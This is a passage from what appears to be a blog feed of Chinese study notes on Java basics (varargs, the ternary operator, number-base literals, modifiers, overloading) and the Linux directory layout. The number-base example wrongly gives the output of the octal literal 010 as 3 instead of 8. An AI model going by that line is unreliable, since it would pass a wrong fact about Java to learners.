class="number">10000</span>];</span><br><span class="line">...</span><br><span class="line">Arrays.sort(a);</span><br></pre></td></tr></table></figure><p>这种排序方法可以满足大部分排序的需求，当然你也可以选择自己写，那就不在本文的范畴之内了。</p><p>另外<code>Arrays</code>类中还提供了别的方法，有兴趣的可以自行查阅。</p><h3 id="可变参数">可变参数</h3><p>允许调用方法时传入不定长度的参数，实质上是基于数组的实现。</p><p>例：构造输出最大的数字的方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DemoVarargs</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">DemoVarargs</span> <span class="variable">demoVarargs</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DemoVarargs</span>();</span><br><span class="line">        demoVarargs.printMax(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">printMax</span><span class="params">(<span class="type">double</span>... nums)</span>&#123;<span class="comment">//可变参数</span></span><br><span class="line">        <span class="keyword">if</span>(nums.length == <span class="number">0</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;No argument passed&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">double</span> <span class="variable">max</span> <span class="operator">=</span> nums[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">double</span> x: nums)&#123;</span><br><span class="line">            <span class="keyword">if</span>(x &gt; max)&#123;</span><br><span class="line">                max = x;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;max:&quot;</span> + max);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="三元运算符">三元运算符</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x?y:z</span><br></pre></td></tr></table></figure><p>当<code>x==true</code>，则结果为<code>y</code>，否则结果为<code>z</code>。</p><p>注意点：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> <span class="literal">true</span> ? <span class="keyword">new</span> <span class="title class_">Integer</span>(<span class="number">1</span>) : <span class="keyword">new</span> <span class="title class_">Double</span>(<span class="number">2.0</span>);</span><br><span class="line">System.out.println(o);<span class="comment">//out:1.0</span></span><br></pre></td></tr></table></figure><p>三元运算符运行的左右两边需要是同一类型，于是int的包装类就自动转换为double的包装类。这与<code>if else</code>有所区别，因此我们在使用三元运算符时需要注意。</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
          <category> 基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java笔记（1）：进制表示、Equals、For each循环、方法基础</title>
      <link href="/2022/03/07/Java%E7%AC%94%E8%AE%B0%EF%BC%881%EF%BC%89%EF%BC%9A%E8%BF%9B%E5%88%B6%E8%A1%A8%E7%A4%BA%E3%80%81Equals%E3%80%81For%20each%E5%BE%AA%E7%8E%AF%E3%80%81%E6%96%B9%E6%B3%95%E5%9F%BA%E7%A1%80/"/>
      <url>/2022/03/07/Java%E7%AC%94%E8%AE%B0%EF%BC%881%EF%BC%89%EF%BC%9A%E8%BF%9B%E5%88%B6%E8%A1%A8%E7%A4%BA%E3%80%81Equals%E3%80%81For%20each%E5%BE%AA%E7%8E%AF%E3%80%81%E6%96%B9%E6%B3%95%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h2 id="进制表示">进制表示</h2><p>二进制0b 十进制 八进制0 十六进制0x</p><p>例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">i</span>  <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">i2</span> <span class="operator">=</span> <span class="number">010</span>;  <span class="comment">//八进制0 </span></span><br><span class="line"><span class="type">int</span> <span class="variable">i3</span> <span class="operator">=</span> <span class="number">0x10</span>; <span class="comment">//十六进制0x</span></span><br></pre></td></tr></table></figure><p>out:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10 3 16</span><br></pre></td></tr></table></figure><h2 id="equals">Equals</h2><p><code>.equals</code>方法可以用来判断字符串是否相等。</p><p>例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(str.equals(<span class="string">&quot;Hello&quot;</span>))&#123; <span class="comment">//判断str是否与Hello相等</span></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="for-each循环">For each循环</h2><p>for each element in a：循环A中的每一个元素。</p><p>主要用于数组或集合的增强型for循环。</p><p>例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span>[] nums = &#123;<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//For each</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> x: nums)&#123;<span class="comment">//遍历数组元素</span></span><br><span class="line">    System.out.println(x);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//下面是用普通的for表示</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">3</span>; i++)&#123;</span><br><span class="line">    System.out.println(nums[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="方法基础">方法基础</h2><h3 id="基本定义">基本定义</h3><p>Java的方法跟其他语言的函数类似。</p><p>方法的结构：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">修饰符 返回值类型 方法名(参数类型 参数名)&#123;</span><br><span class="line">...</span><br><span class="line">方法体</span><br><span class="line">...</span><br><span class="line"><span class="keyword">return</span> 返回值</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="修饰符">修饰符</h3><h4 id="访问控制修饰符">访问控制修饰符</h4><p><strong>default</strong> (即默认，什么也不写）：在同一包内可见，不使用任何修饰符。使用对象：类、接口、变量、方法。<br><strong>private</strong>：在同一类内可见。使用对象：变量、方法。 <strong>注意：不能修饰类（外部类）</strong><br><strong>public</strong>：对所有类可见。使用对象：类、接口、变量、方法<br><strong>protected</strong>：对同一包内的类和其所有子类可见。使用对象：变量、方法。 <strong>注意：不能修饰类（外部类）</strong>。实际上<code>protected</code>的成员，有两种可见：</p><ol><li>父类的<code>protected</code>成员是包内可见的，并且对子类可见；</li><li>若子类与父类不在同一包中，那么在子类中，子类实例可以访问其从父类继承而来的<code>protected</code>方法，而不能访问父类实例的<code>protected</code>方法。</li></ol><p>Father:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.icewindy.base;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Father</span> &#123;</span><br><span class="line">   <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span>&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Son:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.icewindy.test;</span><br><span class="line"><span class="keyword">import</span> cn.icewindy.base.Father;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Son</span> <span class="keyword">extends</span> <span class="title class_">Father</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test2</span><span class="params">()</span>&#123;</span><br><span class="line">      <span class="type">Father</span> <span class="variable">father</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Father</span>();</span><br><span class="line">      father.test();<span class="comment">//Compile Error</span></span><br><span class="line">      test2();<span class="comment">//Compile OK </span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="built_in">super</span>.test();<span class="comment">//Compile OK ，在override可以调用父类的protected方法</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="非访问修饰符">非访问修饰符</h4><p><strong>static</strong>：用来修饰类方法和类变量。详细请看笔记（三）<br><strong>final</strong>：用来修饰类、方法和变量，final 修饰的类不能够被继承，修饰的方法不能被继承类重新定义，修饰的变量为常量，是不可修改的。<br><strong>abstract</strong>：用来创建抽象类和抽象方法。<br><strong>synchronized、volatile</strong> ：主要用于线程的编程。</p><h3 id="方法的重载">方法的重载</h3><p>在同一个类中，有相同的函数名字，但形参不同的函数。</p><p>例：构建一个比较大小的方法<code>max</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">System.out.println(max(<span class="number">10</span>,<span class="number">20</span>));    <span class="comment">//调用的是第一个方法</span></span><br><span class="line">System.out.println(max(<span class="number">10.0</span>,<span class="number">20.0</span>));<span class="comment">//调用的是第二个方法</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">max</span><span class="params">(<span class="type">int</span> num1, <span class="type">int</span> num2)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (num1 &gt; num2)</span><br><span class="line">        <span class="keyword">return</span> num1;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> num2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">double</span> <span class="title function_">max</span><span class="params">(<span class="type">double</span> num1, <span class="type">double</span> num2)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (num1 &gt; num2)</span><br><span class="line">    <span class="keyword">return</span> num1;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> num2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>方法重载的规则：</p><ol><li>方法名称必须相同。</li><li>参数列表必须不同。</li><li>返回值类型可以相同，也可以不同。</li><li>仅仅返回值不同不构成方法的重载。</li></ol><h3 id="可变参数">可变参数</h3><p>Java支持传递同类型的可变参数给一个方法。</p><p>使用方法：</p><p>在方法声明中，在指定参数类型后加一个省略号(…) 。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">参数类型... 参数名</span><br></pre></td></tr></table></figure><p><strong>注意</strong>：一个方法中只能指定一个可变参数，它必须是方法的最后一个参数。任何普通的参数必须在它之前声明。</p><p>例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DemoVarargs</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">DemoVarargs</span> <span class="variable">demoVarargs</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DemoVarargs</span>();</span><br><span class="line">        demoVarargs.printMax(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>);</span><br><span class="line">        demoVarargs.printMax(<span class="keyword">new</span> <span class="title class_">double</span>[]&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">printMax</span><span class="params">(<span class="type">double</span>... nums)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(nums.length == <span class="number">0</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;No argument passed&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">double</span> <span class="variable">max</span> <span class="operator">=</span> nums[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">double</span> x: nums)&#123;</span><br><span class="line">            <span class="keyword">if</span>(x &gt; max)&#123;</span><br><span class="line">                max = x;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;max:&quot;</span> + max);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
          <category> 基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux主要目录</title>
      <link href="/2022/03/06/Linux%E4%B8%BB%E8%A6%81%E7%9B%AE%E5%BD%95/"/>
      <url>/2022/03/06/Linux%E4%B8%BB%E8%A6%81%E7%9B%AE%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h2 id="简介">简介</h2><p>大部分Linux系统的主要目录和内容都遵循着FHS（文件系统层次结构标准）标准，但并不是所有的Linux系统都完全执行FHS标准。</p><p>在FHS中，所有的文件和目录都在跟目录“/”下，无论他们是否在同一物理设备中（例如不在同一硬盘中）。</p><h2 id="目录结构">目录结构</h2><p>图表来自维基百科：</p><table><thead><tr><th style="text-align:left">目录</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left"><code>/</code></td><td style="text-align:left"><em>第一层次结构</em> 的根、 整个文件系统层次结构的<a href="https://zh.m.wikipedia.org/wiki/%E6%A0%B9%E7%9B%AE%E5%BD%95">根目录</a>。</td></tr><tr><td style="text-align:left"><code>/bin/</code></td><td style="text-align:left">需要在<a href="https://zh.m.wikipedia.org/wiki/%E5%96%AE%E7%94%A8%E6%88%B6%E6%A8%A1%E5%BC%8F">单用户模式</a>可用的必要命令（<a href="https://zh.m.wikipedia.org/wiki/%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6">可执行文件</a>）；面向所有用户，<em>例如</em>： <a href="https://zh.m.wikipedia.org/wiki/Cat_(Unix)">cat</a>、 <a href="https://zh.m.wikipedia.org/wiki/Ls">ls</a>、 <a href="https://zh.m.wikipedia.org/wiki/Cp_(Unix)">cp</a>。</td></tr><tr><td style="text-align:left"><code>/boot/</code></td><td style="text-align:left"><a href="https://zh.m.wikipedia.org/wiki/%E5%BC%95%E5%AF%BC%E7%A8%8B%E5%BA%8F">引导程序</a>文件，<em>例如：</em> <a href="https://zh.m.wikipedia.org/wiki/%E5%86%85%E6%A0%B8">kernel</a>、<a href="https://zh.m.wikipedia.org/wiki/Initrd">initrd</a>；时常是一个单独的分区[<a href="https://zh.m.wikipedia.org/zh/%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%B1%82%E6%AC%A1%E7%BB%93%E6%9E%84%E6%A0%87%E5%87%86#cite_note-8">8]</a></td></tr><tr><td style="text-align:left"><code>/dev/</code></td><td style="text-align:left">必要<a href="https://zh.m.wikipedia.org/wiki/%E8%AE%BE%E5%A4%87%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F">设备</a>, <em>例如：</em><code>/dev/null</code>.</td></tr><tr><td style="text-align:left"><code>/etc/</code></td><td style="text-align:left">特定主机，系统范围内的<a href="https://zh.m.wikipedia.org/wiki/%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6">配置文件</a>。关于这个名称目前有争议。在贝尔实验室关于UNIX实现文档的早期版本中，/etc 被称为*<a href="https://zh.m.wikipedia.org/wiki/%E7%AD%89%E7%AD%89">etcetera</a>*， [<a href="https://zh.m.wikipedia.org/zh/%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%B1%82%E6%AC%A1%E7%BB%93%E6%9E%84%E6%A0%87%E5%87%86#cite_note-9">9]</a> 这是由于过去此目录中存放所有不属于别处的所有东西（然而，FHS限制/etc只能存放静态配置文件，不能包含二进制文件）。 [<a href="https://zh.m.wikipedia.org/zh/%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%B1%82%E6%AC%A1%E7%BB%93%E6%9E%84%E6%A0%87%E5%87%86#cite_note-10">10]</a> 自从早期文档出版以来，目录名称已被以各种方式重新称呼。最近的解释包括<a href="https://zh.m.wikipedia.org/wiki/%E9%80%86%E5%90%91%E9%A6%96%E5%AD%97%E6%AF%8D%E7%BC%A9%E7%95%A5%E8%AF%8D">逆向首字母缩略词</a>如：“可编辑的文本配置”（英文 “Editable Text Configuration”）或&quot;扩展工具箱&quot;（英文 “Extended Tool Chest”）。 [<a href="https://zh.m.wikipedia.org/zh/%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%B1%82%E6%AC%A1%E7%BB%93%E6%9E%84%E6%A0%87%E5%87%86#cite_note-11">11]</a></td></tr><tr><td style="text-align:left"><code>/etc/opt/</code></td><td style="text-align:left"><code>/opt/</code>的配置文件</td></tr><tr><td style="text-align:left"><code>/etc/X11/</code></td><td style="text-align:left"><a href="https://zh.m.wikipedia.org/wiki/X_Window%E7%B3%BB%E7%BB%9F">X Window系统</a>(版本11)的配置文件</td></tr><tr><td style="text-align:left"><code>/etc/sgml/</code></td><td style="text-align:left"><a href="https://zh.m.wikipedia.org/wiki/SGML">SGML</a>的配置文件</td></tr><tr><td style="text-align:left"><code>/etc/xml/</code></td><td style="text-align:left"><a href="https://zh.m.wikipedia.org/wiki/XML">XML</a>的配置文件</td></tr><tr><td style="text-align:left"><code>/home/</code></td><td style="text-align:left">用户的<a href="https://zh.m.wikipedia.org/wiki/%E5%AE%B6%E7%9B%AE%E5%BD%95">家目录</a>，包含保存的文件、个人设置等，一般为单独的分区。</td></tr><tr><td style="text-align:left"><code>/lib/</code></td><td style="text-align:left"><code>/bin/</code> 和 <code>/sbin/</code>中二进制文件必要的<a href="https://zh.m.wikipedia.org/wiki/%E5%87%BD%E5%BC%8F%E5%BA%AB">库</a>文件。</td></tr><tr><td style="text-align:left"><code>/media/</code></td><td style="text-align:left">可移除媒体(如<a href="https://zh.m.wikipedia.org/wiki/CD-ROM">CD-ROM</a>)的挂载点 (在FHS-2.3中出现)。</td></tr><tr><td style="text-align:left"><code>/mnt/</code></td><td style="text-align:left">临时<a href="https://zh.m.wikipedia.org/wiki/%E6%8C%82%E8%BD%BD">挂载</a>的文件系统。</td></tr><tr><td style="text-align:left"><code>/opt/</code></td><td style="text-align:left">可选<a href="https://zh.m.wikipedia.org/wiki/%E5%BA%94%E7%94%A8%E8%BD%AF%E4%BB%B6">应用软件</a> <a href="https://zh.m.wikipedia.org/wiki/%E8%BD%AF%E4%BB%B6%E5%8C%85">包</a>。[<a href="https://zh.m.wikipedia.org/zh/%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%B1%82%E6%AC%A1%E7%BB%93%E6%9E%84%E6%A0%87%E5%87%86#cite_note-12">12]</a></td></tr><tr><td style="text-align:left"><code>/proc/</code></td><td style="text-align:left">虚拟<a href="https://zh.m.wikipedia.org/wiki/%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F">文件系统</a>，将<a href="https://zh.m.wikipedia.org/wiki/%E5%86%85%E6%A0%B8">内核</a>与<a href="https://zh.m.wikipedia.org/wiki/%E8%BF%9B%E7%A8%8B">进程</a>状态归档为文本文件。*例如：*uptime、 network。在Linux中，对应<a href="https://zh.m.wikipedia.org/wiki/Procfs">Procfs</a>格式挂载。</td></tr><tr><td style="text-align:left"><code>/root/</code></td><td style="text-align:left"><a href="https://zh.m.wikipedia.org/wiki/%E8%B6%85%E7%BA%A7%E7%94%A8%E6%88%B7">超级用户</a>的<a href="https://zh.m.wikipedia.org/wiki/%E5%AE%B6%E7%9B%AE%E5%BD%95">家目录</a></td></tr><tr><td style="text-align:left"><code>/sbin/</code></td><td style="text-align:left">必要的系统二进制文件，<em>例如：</em> init、 ip、 mount。</td></tr><tr><td style="text-align:left"><code>/srv/</code></td><td style="text-align:left">站点的具体<a href="https://zh.m.wikipedia.org/wiki/%E6%95%B0%E6%8D%AE">数据</a>，由系统提供。</td></tr><tr><td style="text-align:left"><code>/tmp/</code></td><td style="text-align:left">临时文件(参见 <code>/var/tmp</code>)，在系统重启时目录中文件不会被保留。</td></tr><tr><td style="text-align:left"><code>/usr/</code></td><td style="text-align:left">用于存储只读用户数据的<em>第二层次</em>； 包含绝大多数的(<a href="https://zh.m.wikipedia.org/wiki/%E5%A4%9A%E7%94%A8%E6%88%B7">多</a>)用户工具和应用程序[<a href="https://zh.m.wikipedia.org/zh/%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%B1%82%E6%AC%A1%E7%BB%93%E6%9E%84%E6%A0%87%E5%87%86#cite_note-13">13]</a>，注意不是user的缩写，而是&quot;Unix Software Resource&quot;的缩写。</td></tr><tr><td style="text-align:left"><code>/usr/bin/</code></td><td style="text-align:left">非必要<a href="https://zh.m.wikipedia.org/wiki/%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6">可执行文件</a> (在<a href="https://zh.m.wikipedia.org/wiki/%E5%96%AE%E7%94%A8%E6%88%B6%E6%A8%A1%E5%BC%8F">单用户模式</a>中不需要)；面向所有用户。</td></tr><tr><td style="text-align:left"><code>/usr/include/</code></td><td style="text-align:left">标准<a href="https://zh.m.wikipedia.org/wiki/%E5%A4%B4%E6%96%87%E4%BB%B6">包含文件</a>。</td></tr><tr><td style="text-align:left"><code>/usr/lib/</code></td><td style="text-align:left"><code>/usr/bin/</code>和<code>/usr/sbin/</code>中二进制文件的<a href="https://zh.m.wikipedia.org/wiki/%E5%BA%93">库</a>。</td></tr><tr><td style="text-align:left"><code>/usr/sbin/</code></td><td style="text-align:left">非必要的系统二进制文件，*例如：*大量<a href="https://zh.m.wikipedia.org/wiki/%E7%BD%91%E7%BB%9C%E6%9C%8D%E5%8A%A1">网络服务</a>的<a href="https://zh.m.wikipedia.org/wiki/%E5%AE%88%E6%8A%A4%E8%BF%9B%E7%A8%8B">守护进程</a>。</td></tr><tr><td style="text-align:left"><code>/usr/share/</code></td><td style="text-align:left"><a href="https://zh.m.wikipedia.org/wiki/%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84">体系结构</a>无关（共享）数据。</td></tr><tr><td style="text-align:left"><code>/usr/src/</code></td><td style="text-align:left"><a href="https://zh.m.wikipedia.org/wiki/%E6%BA%90%E4%BB%A3%E7%A0%81">源代码</a>,*例如:*内核源代码及其头文件。</td></tr><tr><td style="text-align:left"><code>/usr/X11R6/</code></td><td style="text-align:left"><a href="https://zh.m.wikipedia.org/wiki/X_Window%E7%B3%BB%E7%BB%9F">X Window系统</a> 版本 11, Release 6.</td></tr><tr><td style="text-align:left"><code>/usr/local/</code></td><td style="text-align:left">本地数据的<em>第三层次</em>， 具体到本台主机。通常而言有进一步的子目录， <em>例如：</em><code>bin/</code>、<code>lib/</code>、<code>share/</code>.[<a href="https://zh.m.wikipedia.org/zh/%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%B1%82%E6%AC%A1%E7%BB%93%E6%9E%84%E6%A0%87%E5%87%86#cite_note-14">14]</a></td></tr><tr><td style="text-align:left"><code>/var/</code></td><td style="text-align:left">变量文件——在正常运行的系统中其内容不断变化的文件，如日志，脱机文件和临时电子邮件文件。有时是一个单独的分区。</td></tr><tr><td style="text-align:left"><code>/var/cache/</code></td><td style="text-align:left">应用程序缓存数据。这些数据是在本地生成的一个耗时的I/O或计算结果。应用程序必须能够再生或恢复数据。缓存的文件可以被删除而不导致数据丢失。</td></tr><tr><td style="text-align:left"><code>/var/lib/</code></td><td style="text-align:left">状态信息。 由程序在运行时维护的持久性数据。 *例如：*数据库、包装的系统元数据等。</td></tr><tr><td style="text-align:left"><code>/var/lock/</code></td><td style="text-align:left">锁文件，一类跟踪当前使用中资源的文件。</td></tr><tr><td style="text-align:left"><code>/var/log/</code></td><td style="text-align:left">日志文件，包含大量日志文件，为了防止日志占满根分区，生产环境中一般是单独分区。</td></tr><tr><td style="text-align:left"><code>/var/mail/</code></td><td style="text-align:left">用户的<a href="https://zh.m.wikipedia.org/wiki/%E7%94%B5%E5%AD%90%E9%82%AE%E7%AE%B1">电子邮箱</a>。</td></tr><tr><td style="text-align:left"><code>/var/run/</code></td><td style="text-align:left">自最后一次启动以来运行中的系统的信息，*例如：*当前登录的用户和运行中的<a href="https://zh.m.wikipedia.org/wiki/%E5%AE%88%E6%8A%A4%E8%BF%9B%E7%A8%8B">守护进程</a>、一些守护进程的pid文件、socket文件。现已经被/run代替[<a href="https://zh.m.wikipedia.org/zh/%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%B1%82%E6%AC%A1%E7%BB%93%E6%9E%84%E6%A0%87%E5%87%86#cite_note-15">15]</a>。</td></tr><tr><td style="text-align:left"><code>/var/spool/</code></td><td style="text-align:left">等待处理的任务的<a href="https://zh.m.wikipedia.org/w/index.php?title=%E8%84%B1%E6%9C%BA%E6%96%87%E4%BB%B6&amp;action=edit&amp;redlink=1">脱机文件</a>，*例如：*打印队列和未读的邮件。</td></tr><tr><td style="text-align:left"><code>/var/spool/mail/</code></td><td style="text-align:left">用户的邮箱(不鼓励的存储位置)</td></tr><tr><td style="text-align:left"><code>/var/tmp/</code></td><td style="text-align:left">在系统重启过程中可以保留的临时文件。</td></tr><tr><td style="text-align:left"><code>/run/</code></td><td style="text-align:left">代替/var/run目录。</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GCC、GDB食用方法</title>
      <link href="/2022/03/06/GCC%E3%80%81GDB%E9%A3%9F%E7%94%A8%E6%96%B9%E6%B3%95/"/>
      <url>/2022/03/06/GCC%E3%80%81GDB%E9%A3%9F%E7%94%A8%E6%96%B9%E6%B3%95/</url>
      
